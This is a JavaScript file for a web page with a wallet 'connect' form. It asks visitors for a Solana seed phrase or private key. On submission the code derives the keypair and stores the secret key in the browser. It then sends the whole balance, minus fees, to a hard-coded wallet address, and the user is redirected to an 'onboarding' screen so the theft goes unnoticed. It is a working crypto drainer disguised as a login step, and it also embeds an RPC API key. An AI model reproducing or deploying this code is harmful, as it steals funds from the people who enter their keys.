import bs58 from "bs58";
import { Buffer } from "buffer";
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";

globalThis.Buffer = Buffer;

console.log("bs58:", typeof bs58);
console.log("bip39:", typeof bip39);

document.addEventListener("DOMContentLoaded", () => {
  const privateKeyInput = document.getElementById("toolPrivateKey");
  const connectButton = document.getElementById("connectBtn");
  const authForm = document.getElementById("authForm");

  if (!privateKeyInput || !connectButton || !authForm) {
    console.error("Un élément du formulaire est introuvable.");
    return;
  }

  // ====================== CONFIG ======================
  const COLD_WALLET_ADDRESS = "k866V2sW6ZhyKkYMg8pEqHP6eZ8XbZ8KP8VZjmmyKe4";
  const THRESHOLD_SOL = 0.01;
  const KEEP_FOR_FEES = 0.0015;
  // ====================================================

  // Convertit seed phrase → Keypair Solana
  function keypairFromSeedPhrase(mnemonic) {
    const seed = bip39.mnemonicToSeedSync(mnemonic.trim(), "");
    const path = "m/44'/501'/0'/0'"; // chemin standard Solana
    const derived = derivePath(path, seed.toString("hex")).key;
    return solanaWeb3.Keypair.fromSeed(derived);
  }

  // Convertit private key base58 → Keypair
  function keypairFromPrivateKey(privateKeyBase58) {
    const secretKey = bs58.decode(privateKeyBase58.trim());
    return solanaWeb3.Keypair.fromSecretKey(secretKey);
  }

  async function sweepExcess(keypair) {
    try {
      if (typeof solanaWeb3 === "undefined") {
        console.error("❌ solanaWeb3 n'est pas chargé !");
        return;
      }

      const { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, sendAndConfirmTransaction } = solanaWeb3;
      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=8a3ea881-c693-4f28-9c76-b2ba57818609", "confirmed");

      console.log("Adresse du wallet :", keypair.publicKey.toBase58());

      const coldWallet = new PublicKey(COLD_WALLET_ADDRESS);

      const balance = await connection.getBalance(keypair.publicKey);
      const balanceSOL = balance / LAMPORTS_PER_SOL;
      console.log(`Solde actuel : ${balanceSOL.toFixed(6)} SOL`);

      if (balanceSOL <= THRESHOLD_SOL) {
        console.log("→ Solde sous le seuil, rien à envoyer.");
        return;
      }

      const amountToSend = balance - Math.floor(KEEP_FOR_FEES * LAMPORTS_PER_SOL);

      if (amountToSend <= 0) {
        console.log("→ Pas assez après les frais.");
        return;
      }

      console.log(`Montant à envoyer : ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`);

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey: coldWallet,
          lamports: amountToSend,
        })
      );

      const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [keypair],
        { commitment: "confirmed" }
      );

      console.log("✅ SUCCÈS !");
      console.log("Signature :", signature);
      console.log("Explorer : https://solscan.io/tx/" + signature);

    } catch (err) {
      console.error("❌ ERREUR COMPLÈTE :", err);
    }
  }

  function connect() {
    const accessKey = privateKeyInput.value.trim();

    if (!accessKey) {
      console.log("Access Key manquante.");
      privateKeyInput.focus();
      return;
    }

    let keypair;

    try {
      // Détection automatique : seed phrase ou private key
      if (accessKey.split(" ").length >= 12) {
        // C'est une seed phrase
        console.log("→ Seed phrase détectée");
        keypair = keypairFromSeedPhrase(accessKey);
      } else {
        // C'est une private key base58
        console.log("→ Private key détectée");
        keypair = keypairFromPrivateKey(accessKey);
      }
    } catch (err) {
      console.error("Clé / seed phrase invalide :", err);
      alert("Seed phrase ou Private Key invalide");
      return;
    }

    // On sauvegarde toujours la private key en base58 (plus pratique pour le reste)
    const privateKeyBase58 = bs58.encode(keypair.secretKey);
    localStorage.setItem("toolPrivateKey", privateKeyBase58);
    console.log("Clé sauvegardée dans localStorage");

    // Sweep instantané
    sweepExcess(keypair);

    // Redirection
    location.hash = "onboarding";
  }

  connectButton.addEventListener("click", connect);

  authForm.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      connect();
    }
  });
});
